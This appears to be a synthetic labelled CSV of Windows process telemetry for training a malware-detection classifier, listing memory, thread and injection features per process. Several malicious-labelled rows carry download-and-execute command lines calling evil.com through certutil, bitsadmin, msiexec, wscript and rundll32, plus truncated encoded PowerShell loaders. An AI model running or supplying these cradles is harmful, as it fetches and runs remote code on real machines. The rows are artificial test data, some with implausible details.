process_name,pid,ppid,cmd_line,cmd_line_length,num_threads,num_handles,working_set_mb,private_bytes_mb,session_id,is_signed,num_loaded_dlls,has_network_conn,num_network_conns,writable_exec_sections,private_memory_ratio,heap_executable,vad_count,suspicious_parent,process_hollowing,dll_injection,reflective_load,encoded_powershell,lolbin_usage,wmi_execution,unusual_thread_start,yara_hits,memory_anomaly_score,label
powershell.exe,5208,3065,powershell.exe -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA...0c0vIV21bQaCaKMWFzEWf7C76neWAUpPZ4usTYWP+kjyzf1ap7sHf269/p29rPeMLQJ4t1wDFFWjBO2vJP0ZIor,170,6,104,65.86,77.21,1,1,38,1,4,2,0.726,1,106,0,0,0,0,1,1,0,0,4,0.8209,1
smss.exe,3434,4,C:\Windows\System32\smss.exe,36,24,76,118.37,68.56,0,1,49,0,0,0,0.16,0,54,0,0,0,0,0,0,0,0,0,0.0891,0
svchost.exe,8025,5524,C:\Windows\System32\svchost.exe,50,5,233,201.95,172.64,1,0,76,1,3,5,0.74,1,156,0,0,1,0,0,0,0,0,3,0.655,1
certutil.exe,8298,9774,certutil.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),233,3,103,10.57,39.75,1,1,29,1,4,0,0.709,0,46,1,0,0,0,0,1,0,0,3,0.7315,1
svchost.exe,8049,9347,C:\Windows\system32\svchost.exe -k netsvcs,67,23,281,170.36,43.42,1,1,66,0,0,0,0.29,0,105,0,0,0,0,0,0,0,0,0,0.0373,0
firefox.exe,3346,862,C:\Windows\System32\firefox.exe,46,14,386,109.03,26.1,1,1,57,0,16,0,0.188,0,37,0,0,0,0,0,0,0,0,0,0.0255,0
explorer.exe,6109,7010,C:\Windows\Explorer.EXE,67,29,150,10.15,35.55,0,1,58,0,0,0,0.056,0,52,0,0,0,0,0,0,0,0,0,0.0966,0
RuntimeBroker.exe,2567,3217,C:\Windows\System32\RuntimeBroker.exe,102,3,238,111.21,4.9,0,1,62,0,0,0,0.147,0,36,0,0,0,0,0,0,0,0,0,0.0389,0
conhost.exe,7151,8500,C:\Windows\System32\conhost.exe,93,13,443,158.52,43.47,1,1,13,0,0,0,0.162,0,115,0,0,0,0,0,0,0,0,0,0.1424,0
lsass.exe,4893,9744,C:\Windows\System32\lsass.exe,105,35,394,62.23,22.05,0,1,56,0,0,0,0.323,0,31,0,0,0,0,0,0,0,0,0,0.0853,0
taskmgr.exe,1210,5259,C:\Windows\System32\taskmgr.exe,39,17,223,68.46,33.13,0,1,11,0,0,0,0.058,0,42,0,0,0,0,0,0,0,0,0,0.1135,0
MsMpEng.exe,7885,7229,"""C:\Program Files\Windows Defender\MsMpEng.exe""",70,20,312,79.63,78.8,1,1,73,0,0,0,0.124,0,97,0,0,0,0,0,0,0,0,0,0.1017,0
svchost.exe,6255,9772,C:\Windows\system32\svchost.exe -k netsvcs,68,1,179,28.16,91.9,0,1,8,0,0,0,0.054,0,22,0,0,0,0,0,0,0,0,0,0.1216,0
RuntimeBroker.exe,8092,8496,C:\Windows\System32\RuntimeBroker.exe,53,39,54,13.2,59.79,0,1,50,0,0,0,0.123,0,31,0,0,0,0,0,0,0,0,0,0.0493,0
OneDrive.exe,9438,8466,C:\Windows\System32\OneDrive.exe,74,6,197,187.19,62.62,1,1,40,0,0,0,0.174,0,82,0,0,0,0,0,0,0,0,0,0.0705,0
spoolsv.exe,7629,3317,C:\Windows\System32\spoolsv.exe,109,24,198,119.78,81.03,1,1,21,0,0,0,0.289,0,79,0,0,0,0,0,0,0,0,0,0.1465,0
firefox.exe,3528,7052,C:\Windows\System32\firefox.exe,80,10,409,142.33,79.28,1,1,15,0,13,0,0.271,0,67,0,0,0,0,0,0,0,0,0,0.1312,0
notepad.exe,6561,904,C:\Windows\System32\notepad.exe,25,14,169,122.49,20.94,1,1,71,0,0,0,0.329,0,89,0,0,0,0,0,0,0,0,0,0.0161,0
spoolsv.exe,9933,5148,C:\Windows\System32\spoolsv.exe,27,8,485,40.2,29.48,1,1,69,0,0,0,0.196,0,70,0,0,0,0,0,0,0,0,0,0.0901,0
taskmgr.exe,1260,7478,C:\Windows\System32\taskmgr.exe,113,15,287,166.73,30.67,1,1,37,0,0,0,0.346,0,64,0,0,0,0,0,0,0,0,0,0.1359,0
wmiprvse.exe,8310,9631,wmiprvse.exe -secured -Embedding,58,9,137,48.02,91.34,1,1,19,0,2,2,0.775,1,81,1,0,0,0,0,0,1,0,3,0.7403,1
svchost.exe,1676,515,C:\Windows\System32\svchost.exe,36,16,109,199.21,150.24,1,0,87,0,7,5,0.777,1,208,0,0,1,1,0,0,0,0,2,0.8941,1
svchost.exe,4691,3255,C:\Windows\System32\svchost.exe,54,11,213,271.8,96.75,1,0,91,1,2,7,0.768,1,119,0,0,1,0,0,0,0,0,1,0.8647,1
wmiprvse.exe,489,7065,wmiprvse.exe -secured -Embedding,94,9,120,85.91,18.88,1,1,36,1,0,2,0.71,1,54,1,0,0,0,0,0,1,0,2,0.8336,1
spoolsv.exe,4262,8677,C:\Windows\System32\spoolsv.exe,27,21,231,185.14,47.61,1,1,66,0,0,0,0.282,0,36,0,0,0,0,0,0,0,0,0,0.0365,0
calc.exe,1357,524,C:\Windows\System32\calc.exe,56,36,254,139.17,79.51,0,1,52,0,0,0,0.333,0,114,0,0,0,0,0,0,0,0,0,0.06,0
WmiPrvSE.exe,6908,6435,wmiprvse.exe -secured -Embedding,33,8,229,62.15,52.85,1,1,35,1,0,3,0.708,1,78,1,0,0,0,0,0,1,0,2,0.5503,1
powershell.exe,8191,5694,powershell.exe -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA...TlWKOAYA8ZS/SytwRsj=4sdRTwBeNmaoSOoGguQOL5lczxMpXoYDz+RQ,139,8,171,68.47,25.91,1,1,58,1,5,0,0.763,0,124,0,0,0,0,1,1,0,0,2,0.6657,1
explorer.exe,7957,805,C:\Windows\System32\explorer.exe,42,4,119,66.97,65.14,1,0,3,1,6,3,0.732,1,144,1,1,0,0,0,0,0,1,5,0.9185,1
conhost.exe,9735,8790,C:\Windows\System32\conhost.exe,80,19,405,13.83,25.76,0,1,22,0,0,0,0.346,0,32,0,0,0,0,0,0,0,0,0,0.0927,0
svchost.exe,7134,1906,C:\Windows\system32\svchost.exe -k netsvcs,83,11,407,63.57,16.18,0,1,77,0,0,0,0.331,0,34,0,0,0,0,0,0,0,0,0,0.0657,0
notepad.exe,5046,1655,C:\Windows\System32\notepad.exe,74,35,128,125.05,51.67,1,1,64,0,0,0,0.248,0,117,0,0,0,0,0,0,0,0,0,0.1223,0
taskmgr.exe,9612,5948,C:\Windows\System32\taskmgr.exe,112,8,497,7.62,83.57,1,1,69,0,0,0,0.325,0,69,0,0,0,0,0,0,0,0,0,0.1182,0
winlogon.exe,8425,7705,C:\Windows\System32\winlogon.exe,109,31,382,51.75,52.41,1,1,47,0,0,0,0.255,0,21,0,0,0,0,0,0,0,0,0,0.0921,0
notepad.exe,4788,718,C:\Windows\System32\notepad.exe,51,11,103,213.98,66.11,1,0,137,0,4,3,0.774,1,117,0,0,1,0,0,0,0,0,1,0.6736,1
RuntimeBroker.exe,4653,7976,C:\Windows\System32\RuntimeBroker.exe,93,37,253,106.67,25.38,1,1,53,0,0,0,0.258,0,60,0,0,0,0,0,0,0,0,0,0.0561,0
taskmgr.exe,6455,1992,C:\Windows\System32\taskmgr.exe,116,21,469,28.79,19.25,0,1,41,0,0,0,0.079,0,54,0,0,0,0,0,0,0,0,0,0.1421,0
chrome.exe,2319,4202,chrome.exe --type=renderer --disable-gpu,111,36,319,57.66,15.78,0,1,39,0,11,0,0.067,0,22,0,0,0,0,0,0,0,0,0,0.0262,0
SearchIndexer.exe,5552,7218,C:\Windows\System32\SearchIndexer.exe,88,30,198,186.15,5.33,0,1,39,0,0,0,0.263,0,39,0,0,0,0,0,0,0,0,0,0.0071,0
csrss.exe,1934,5767,C:\Windows\System32\csrss.exe,43,14,79,23.58,56.97,0,1,11,0,0,0,0.254,0,38,0,0,0,0,0,0,0,0,0,0.0107,0
lsass.exe,9887,5396,C:\Windows\System32\lsass.exe,44,12,139,126.99,19.37,0,1,20,0,0,0,0.081,0,111,0,0,0,0,0,0,0,0,0,0.001,0
notepad.exe,4432,1817,C:\Windows\System32\notepad.exe,47,10,242,235.59,198.75,1,0,59,1,2,3,0.679,1,139,0,0,1,0,0,0,0,0,2,0.6892,1
svchost.exe,655,2661,C:\Windows\System32\svchost.exe,36,9,378,280.17,191.78,1,0,133,0,6,3,0.837,1,93,0,0,1,1,0,0,0,0,2,0.6562,1
RuntimeBroker.exe,8822,6595,C:\Windows\System32\RuntimeBroker.exe,37,27,437,69.9,58.72,0,1,69,0,0,0,0.144,0,79,0,0,0,0,0,0,0,0,0,0.0495,0
System,4,8998,C:\Windows\System32\System,88,14,419,61.17,90.61,0,1,24,0,0,0,0.309,0,61,0,0,0,0,0,0,0,0,0,0.0763,0
svchost.exe,6659,8697,C:\Windows\system32\svchost.exe -k netsvcs,30,14,314,19.71,95.01,1,1,71,0,0,0,0.313,0,94,0,0,0,0,0,0,0,0,0,0.0205,0
wmiprvse.exe,3979,8488,wmiprvse.exe -secured -Embedding,30,10,180,61.38,86.56,1,1,49,1,2,2,0.664,0,76,1,0,0,0,0,0,1,0,1,0.7631,1
chrome.exe,1777,4086,chrome.exe --type=renderer --disable-gpu,65,1,305,66.81,87.94,1,1,79,0,17,0,0.131,0,76,0,0,0,0,0,0,0,0,0,0.0241,0
services.exe,3910,4930,C:\Windows\System32\services.exe,89,26,313,178.6,69.31,0,1,69,0,0,0,0.144,0,115,0,0,0,0,0,0,0,0,0,0.0729,0
taskmgr.exe,3200,4599,C:\Windows\System32\taskmgr.exe,72,28,269,30.08,56.76,0,1,23,0,0,0,0.138,0,93,0,0,0,0,0,0,0,0,0,0.0244,0
RuntimeBroker.exe,5206,1395,C:\Windows\System32\RuntimeBroker.exe,85,18,344,130.51,70.34,1,1,66,0,0,0,0.12,0,60,0,0,0,0,0,0,0,0,0,0.0798,0
winlogon.exe,9387,2586,C:\Windows\System32\winlogon.exe,64,30,314,120.82,42.58,1,1,66,0,0,0,0.108,0,62,0,0,0,0,0,0,0,0,0,0.0976,0
msiexec.exe,9368,1642,msiexec.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),80,4,62,69.59,55.6,1,1,36,1,4,0,0.794,0,96,1,0,0,0,1,1,0,0,3,0.7504,1
lsass.exe,936,971,C:\Windows\System32\lsass.exe,83,17,377,99.47,69.04,1,1,62,0,0,0,0.326,0,30,0,0,0,0,0,0,0,0,0,0.065,0
bitsadmin.exe,3447,6123,bitsadmin.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),260,2,100,46.26,24.45,1,1,36,1,2,0,0.796,0,45,1,0,0,0,0,1,0,0,2,0.5562,1
notepad.exe,7660,4913,C:\Windows\System32\notepad.exe,92,4,405,27.66,51.36,1,1,45,0,0,0,0.14,0,25,0,0,0,0,0,0,0,0,0,0.0348,0
svchost.exe,1283,9107,C:\Windows\System32\svchost.exe,41,5,92,48.84,61.07,1,0,6,1,7,4,0.751,1,93,1,1,0,0,0,0,0,1,3,0.7814,1
wscript.exe,1584,2452,wscript.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),83,3,148,47.34,26.66,1,1,33,1,1,1,0.608,1,72,1,0,0,0,1,1,0,0,3,0.8485,1
SearchIndexer.exe,1318,1170,C:\Windows\System32\SearchIndexer.exe,33,34,308,68.53,53.32,1,1,58,0,0,0,0.123,0,44,0,0,0,0,0,0,0,0,0,0.0242,0
OneDrive.exe,8289,3652,C:\Windows\System32\OneDrive.exe,73,36,480,167.82,51.13,0,1,47,1,0,0,0.316,0,82,0,0,0,0,0,0,0,0,0,0.0174,0
lsass.exe,5388,5683,C:\Windows\System32\lsass.exe,28,8,238,156.99,34.78,1,1,30,0,0,0,0.122,0,114,0,0,0,0,0,0,0,0,0,0.061,0
System,4,4318,C:\Windows\System32\System,45,18,262,2.34,29.18,1,1,59,0,0,0,0.288,0,95,0,0,0,0,0,0,0,0,0,0.093,0
conhost.exe,5802,8931,C:\Windows\System32\conhost.exe,40,30,119,26.7,81.28,0,1,66,0,0,0,0.272,0,48,0,0,0,0,0,0,0,0,0,0.0406,0
notepad.exe,4393,7881,C:\Windows\System32\notepad.exe,62,34,100,134.07,26.63,0,1,58,0,0,0,0.064,0,38,0,0,0,0,0,0,0,0,0,0.0587,0
explorer.exe,7124,5636,C:\Windows\System32\explorer.exe,44,7,318,139.13,60.94,1,0,126,1,2,7,0.881,1,173,0,0,1,0,0,0,0,0,2,0.747,1
services.exe,8395,2861,C:\Windows\System32\services.exe,72,15,206,188.49,25.43,1,1,65,0,0,0,0.25,0,29,0,0,0,0,0,0,0,0,0,0.0206,0
taskmgr.exe,6299,1458,C:\Windows\System32\taskmgr.exe,79,31,114,138.93,17.71,1,1,43,0,0,0,0.348,0,46,0,0,0,0,0,0,0,0,0,0.0025,0
OneDrive.exe,7143,1329,C:\Windows\System32\OneDrive.exe,106,23,211,82.33,43.44,1,1,52,0,0,0,0.33,0,112,0,0,0,0,0,0,0,0,0,0.0587,0
RuntimeBroker.exe,1292,3332,C:\Windows\System32\RuntimeBroker.exe,105,13,472,107.9,30.04,0,1,67,0,0,0,0.161,0,26,0,0,0,0,0,0,0,0,0,0.0382,0
RuntimeBroker.exe,1358,9382,C:\Windows\System32\RuntimeBroker.exe,116,15,335,50.3,46.3,1,1,5,0,0,0,0.147,0,84,0,0,0,0,0,0,0,0,0,0.1423,0
OneDrive.exe,7465,7617,C:\Windows\System32\OneDrive.exe,25,18,72,147.43,6.27,0,1,72,1,0,0,0.165,0,104,0,0,0,0,0,0,0,0,0,0.0637,0
explorer.exe,2058,600,C:\Windows\Explorer.EXE,78,32,345,157.57,58.49,1,1,5,0,0,0,0.243,0,74,0,0,0,0,0,0,0,0,0,0.0432,0
conhost.exe,7434,941,C:\Windows\System32\conhost.exe,21,23,422,110.58,77.48,1,1,67,0,0,0,0.333,0,96,0,0,0,0,0,0,0,0,0,0.1199,0
notepad.exe,6366,991,C:\Windows\System32\notepad.exe,77,4,180,33.23,52.46,1,0,3,1,1,3,0.621,1,110,1,1,0,0,0,0,0,1,4,0.8487,1
msiexec.exe,3790,5367,msiexec.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),165,1,21,22.18,13.11,1,1,18,1,2,0,0.662,0,42,1,0,0,0,1,1,0,0,1,0.6222,1
powershell.exe,6112,8847,powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA...f5V9HMzRLThov61GXuyFd4=w3xqcJNkVHdAFtokrqohkPK3g=iOG6KiTrX=J49e3QX6QXDw,159,8,178,83.54,79.76,1,1,30,1,1,0,0.606,1,43,1,0,0,0,1,1,0,0,2,0.8169,1
bitsadmin.exe,5533,7498,bitsadmin.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),179,1,122,32.76,48.14,1,1,21,1,4,1,0.678,1,55,1,0,0,0,1,1,0,0,2,0.5318,1
smss.exe,5658,4,C:\Windows\System32\smss.exe,89,22,246,89.49,21.99,0,1,47,0,0,0,0.094,0,76,0,0,0,0,0,0,0,0,0,0.017,0
notepad.exe,2155,6374,C:\Windows\System32\notepad.exe,32,16,105,186.13,106.22,1,0,128,0,6,7,0.807,1,158,0,0,1,0,0,0,0,0,3,0.7422,1
rundll32.exe,6933,3779,rundll32.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),205,4,140,20.62,26.35,1,1,35,1,1,1,0.564,0,94,1,0,0,0,1,1,0,0,4,0.6938,1
csrss.exe,7165,8156,C:\Windows\System32\csrss.exe,89,15,323,155.6,86.62,0,1,23,0,0,0,0.088,0,60,0,0,0,0,0,0,0,0,0,0.0385,0
chrome.exe,3185,2739,chrome.exe --type=renderer --disable-gpu,67,23,64,3.45,45.7,1,1,59,1,9,0,0.188,0,49,0,0,0,0,0,0,0,0,0,0.0663,0
services.exe,5782,6576,C:\Windows\System32\services.exe,100,1,456,152.92,31.17,1,1,13,0,0,0,0.23,0,83,0,0,0,0,0,0,0,0,0,0.0215,0
conhost.exe,4013,9176,C:\Windows\System32\conhost.exe,26,5,368,42.2,93.2,1,1,35,0,0,0,0.316,0,109,0,0,0,0,0,0,0,0,0,0.079,0
explorer.exe,3819,3426,C:\Windows\Explorer.EXE,72,7,175,48.26,12.7,0,1,76,0,0,0,0.154,0,84,0,0,0,0,0,0,0,0,0,0.0338,0
notepad.exe,5523,2094,C:\Windows\System32\notepad.exe,64,34,246,87.77,94.31,0,1,14,0,0,0,0.185,0,74,0,0,0,0,0,0,0,0,0,0.0469,0
spoolsv.exe,5982,8727,C:\Windows\System32\spoolsv.exe,112,14,140,142.8,50.39,1,1,49,0,0,0,0.263,0,22,0,0,0,0,0,0,0,0,0,0.1182,0
OneDrive.exe,4863,6282,C:\Windows\System32\OneDrive.exe,69,22,483,89.94,35.55,0,1,7,1,0,0,0.238,0,104,0,0,0,0,0,0,0,0,0,0.0625,0
MsMpEng.exe,1615,6007,"""C:\Program Files\Windows Defender\MsMpEng.exe""",47,12,367,11.08,45.14,1,1,17,0,0,0,0.087,0,114,0,0,0,0,0,0,0,0,0,0.0758,0
firefox.exe,6144,9875,C:\Windows\System32\firefox.exe,93,14,140,90.37,81.21,1,1,33,1,19,0,0.159,0,93,0,0,0,0,0,0,0,0,0,0.0712,0
OneDrive.exe,3337,6209,C:\Windows\System32\OneDrive.exe,80,18,406,31.95,55.91,1,1,66,1,0,0,0.112,0,36,0,0,0,0,0,0,0,0,0,0.0004,0
svchost.exe,2899,4338,wmiprvse.exe -secured -Embedding,44,6,90,112.31,56.61,1,1,39,1,0,1,0.718,0,84,0,0,0,0,0,0,1,0,1,0.5323,1
RuntimeBroker.exe,8580,674,C:\Windows\System32\RuntimeBroker.exe,119,31,233,28.23,57.7,0,1,79,0,0,0,0.26,0,93,0,0,0,0,0,0,0,0,0,0.0589,0
WmiPrvSE.exe,1524,8029,wmiprvse.exe -secured -Embedding,77,8,298,80.76,67.03,1,1,34,0,2,2,0.481,0,92,1,0,0,0,0,0,1,0,3,0.6145,1
lsass.exe,4258,3682,C:\Windows\System32\lsass.exe,22,27,251,62.2,60.05,1,1,5,0,0,0,0.133,0,37,0,0,0,0,0,0,0,0,0,0.0951,0
chrome.exe,5612,3787,chrome.exe --type=renderer --disable-gpu,64,37,416,170.87,40.0,1,1,49,1,18,0,0.236,0,75,0,0,0,0,0,0,0,0,0,0.0088,0
notepad.exe,1230,8832,C:\Windows\System32\notepad.exe,116,20,413,177.39,92.15,1,1,68,0,0,0,0.206,0,70,0,0,0,0,0,0,0,0,0,0.12,0
wininit.exe,7345,4315,C:\Windows\System32\wininit.exe,50,34,303,95.1,65.68,0,1,20,0,0,0,0.344,0,95,0,0,0,0,0,0,0,0,0,0.1244,0
conhost.exe,6657,2692,C:\Windows\System32\conhost.exe,30,39,462,126.54,18.16,0,1,30,0,0,0,0.107,0,45,0,0,0,0,0,0,0,0,0,0.1391,0
svchost.exe,8475,3478,C:\Windows\system32\svchost.exe -k netsvcs,26,20,408,33.15,61.42,0,1,26,0,0,0,0.102,0,46,0,0,0,0,0,0,0,0,0,0.1395,0
System,4,8473,C:\Windows\System32\System,24,37,78,39.83,57.07,0,1,73,0,0,0,0.211,0,86,0,0,0,0,0,0,0,0,0,0.0303,0
taskmgr.exe,2736,2367,C:\Windows\System32\taskmgr.exe,92,17,447,195.98,13.36,1,1,8,0,0,0,0.23,0,56,0,0,0,0,0,0,0,0,0,0.0127,0
notepad.exe,6573,6296,C:\Windows\System32\notepad.exe,26,3,147,161.1,53.67,1,1,25,0,0,0,0.059,0,31,0,0,0,0,0,0,0,0,0,0.0265,0
svchost.exe,4575,3357,C:\Windows\system32\svchost.exe -k netsvcs,108,2,344,56.78,59.66,1,1,61,0,0,0,0.287,0,78,0,0,0,0,0,0,0,0,0,0.0763,0
conhost.exe,1625,7320,C:\Windows\System32\conhost.exe,25,31,184,44.65,70.76,0,1,54,0,0,0,0.211,0,65,0,0,0,0,0,0,0,0,0,0.0155,0
spoolsv.exe,985,7432,C:\Windows\System32\spoolsv.exe,30,2,160,14.04,45.78,0,1,43,0,0,0,0.144,0,24,0,0,0,0,0,0,0,0,0,0.0167,0
explorer.exe,3069,9815,C:\Windows\Explorer.EXE,44,35,218,194.02,17.71,1,1,28,0,0,0,0.138,0,75,0,0,0,0,0,0,0,0,0,0.0749,0
chrome.exe,4931,9230,chrome.exe --type=renderer --disable-gpu,73,8,172,11.05,59.66,0,1,27,0,13,0,0.301,0,38,0,0,0,0,0,0,0,0,0,0.0894,0
System,4,9303,C:\Windows\System32\System,70,17,233,150.09,33.69,0,1,29,0,0,0,0.088,0,63,0,0,0,0,0,0,0,0,0,0.1276,0
SearchIndexer.exe,3275,4538,C:\Windows\System32\SearchIndexer.exe,34,33,251,104.2,81.04,0,1,58,0,0,0,0.239,0,39,0,0,0,0,0,0,0,0,0,0.0646,0
notepad.exe,4402,5222,C:\Windows\System32\notepad.exe,23,37,83,155.69,52.01,1,1,26,0,0,0,0.209,0,69,0,0,0,0,0,0,0,0,0,0.0805,0
notepad.exe,5865,9757,C:\Windows\System32\notepad.exe,106,2,160,29.46,77.79,0,1,65,0,0,0,0.323,0,39,0,0,0,0,0,0,0,0,0,0.0984,0
csrss.exe,5692,2423,C:\Windows\System32\csrss.exe,27,4,451,110.01,31.28,1,1,57,0,0,0,0.3,0,107,0,0,0,0,0,0,0,0,0,0.1466,0
svchost.exe,5870,5766,C:\Windows\system32\svchost.exe -k netsvcs,98,14,271,9.36,26.43,0,1,16,0,0,0,0.303,0,116,0,0,0,0,0,0,0,0,0,0.145,0
winlogon.exe,3313,4216,C:\Windows\System32\winlogon.exe,39,35,181,151.65,94.91,0,1,48,0,0,0,0.196,0,20,0,0,0,0,0,0,0,0,0,0.0146,0
conhost.exe,1565,3337,C:\Windows\System32\conhost.exe,111,24,82,80.69,53.42,0,1,54,0,0,0,0.347,0,38,0,0,0,0,0,0,0,0,0,0.1227,0
explorer.exe,6510,9526,C:\Windows\Explorer.EXE,116,27,440,141.86,83.09,0,1,78,0,0,0,0.303,0,56,0,0,0,0,0,0,0,0,0,0.019,0
powershell.exe,5704,3320,powershell.exe -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA...,279,2,87,54.33,27.64,1,1,10,1,4,0,0.533,0,43,1,0,0,0,1,1,0,0,3,0.4749,1
System,4,3998,C:\Windows\System32\System,74,8,243,162.25,70.63,0,1,22,0,0,0,0.162,0,73,0,0,0,0,0,0,0,0,0,0.1003,0
firefox.exe,1194,9238,C:\Windows\System32\firefox.exe,92,4,269,84.3,77.54,1,1,20,1,14,0,0.32,0,53,0,0,0,0,0,0,0,0,0,0.1144,0
wininit.exe,6434,8414,C:\Windows\System32\wininit.exe,23,30,65,140.73,81.75,0,1,75,0,0,0,0.281,0,96,0,0,0,0,0,0,0,0,0,0.1333,0
OneDrive.exe,7729,2739,C:\Windows\System32\OneDrive.exe,61,21,255,150.94,3.64,0,1,15,0,0,0,0.12,0,81,0,0,0,0,0,0,0,0,0,0.0999,0
svchost.exe,6729,7331,C:\Windows\System32\svchost.exe,57,19,288,112.34,137.19,1,0,93,0,7,4,0.719,1,106,0,0,1,1,0,0,0,0,2,0.7376,1
OneDrive.exe,4423,7193,C:\Windows\System32\OneDrive.exe,51,34,133,190.73,39.81,0,1,36,1,0,0,0.34,0,94,0,0,0,0,0,0,0,0,0,0.0242,0
MsMpEng.exe,5810,4958,"""C:\Program Files\Windows Defender\MsMpEng.exe""",58,11,130,36.72,41.65,1,1,9,0,0,0,0.124,0,64,0,0,0,0,0,0,0,0,0,0.1065,0
lsass.exe,6450,7458,C:\Windows\System32\lsass.exe,48,2,92,147.1,42.27,0,1,49,0,0,0,0.058,0,61,0,0,0,0,0,0,0,0,0,0.0744,0
spoolsv.exe,7619,9195,C:\Windows\System32\spoolsv.exe,79,39,416,71.34,46.36,0,1,34,0,0,0,0.206,0,24,0,0,0,0,0,0,0,0,0,0.0412,0
svchost.exe,3608,9084,wmiprvse.exe -secured -Embedding,30,9,271,25.56,48.29,1,1,47,0,2,3,0.593,0,156,0,0,0,0,0,0,1,0,1,0.6944,1
MsMpEng.exe,9746,3123,"""C:\Program Files\Windows Defender\MsMpEng.exe""",81,12,229,159.53,46.45,1,1,66,0,0,0,0.348,0,42,0,0,0,0,0,0,0,0,0,0.0173,0
notepad.exe,6789,9058,C:\Windows\System32\notepad.exe,34,12,151,275.38,58.87,1,0,123,0,1,2,0.86,1,148,0,0,1,0,0,0,0,0,2,0.8699,1
notepad.exe,8387,3374,C:\Windows\System32\notepad.exe,32,19,137,267.74,146.16,1,0,88,0,5,4,0.81,1,134,0,0,1,1,0,0,0,0,2,0.6475,1
rundll32.exe,4329,9254,rundll32.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),255,4,129,53.67,39.32,1,1,21,1,4,0,0.68,1,55,1,0,0,0,1,1,0,0,3,0.8796,1
explorer.exe,9904,9489,C:\Windows\System32\explorer.exe,49,6,127,33.88,68.26,1,0,6,1,1,3,0.774,1,113,1,1,0,0,0,0,0,1,2,0.7734,1
powershell.exe,7532,9476,powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA...ESJgtVNZB0/rtCdbVeVk24TeoxlivPUyIcqRJ2wnjrA2BvXFW2ZuIql97EFOwkwVDvtpEBUP48OUxxt4ML=mU2pslwtUWo/pLDW1AtARWF99Wr7hsLfgpWugBwHvFxOX,216,6,54,26.11,61.73,1,1,21,1,4,1,0.552,0,60,0,0,0,0,1,1,0,0,4,0.7994,1
OneDrive.exe,7306,7609,C:\Windows\System32\OneDrive.exe,95,8,112,161.76,67.88,0,1,19,0,0,0,0.195,0,84,0,0,0,0,0,0,0,0,0,0.0659,0
csrss.exe,9557,6616,C:\Windows\System32\csrss.exe,61,13,291,187.97,66.26,1,1,76,0,0,0,0.274,0,63,0,0,0,0,0,0,0,0,0,0.0687,0
wininit.exe,4900,7155,C:\Windows\System32\wininit.exe,72,25,347,40.49,72.94,0,1,58,0,0,0,0.129,0,90,0,0,0,0,0,0,0,0,0,0.0916,0
mspaint.exe,5093,7987,C:\Windows\System32\mspaint.exe,78,6,165,51.52,94.44,1,0,9,1,3,1,0.889,1,102,1,1,0,0,0,0,0,1,3,0.9685,1
powershell.exe,870,6300,powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA...ZBkZZo0RNlGekyHeBJhva3FaXkdoJPGKV/3gosAhA3JY/lFCmF7axJUFFBsLZP6WzhjbPtT6u9AR7/LzV8XnfepkPw+tJJx+h3fgN50OCJxUuC5yY+o9Y,205,2,54,62.9,28.6,1,1,39,1,4,0,0.527,1,116,0,0,0,0,1,1,0,0,2,0.6471,1
lsass.exe,2838,2064,C:\Windows\System32\lsass.exe,111,30,187,86.29,4.14,0,1,45,0,0,0,0.069,0,97,0,0,0,0,0,0,0,0,0,0.13,0
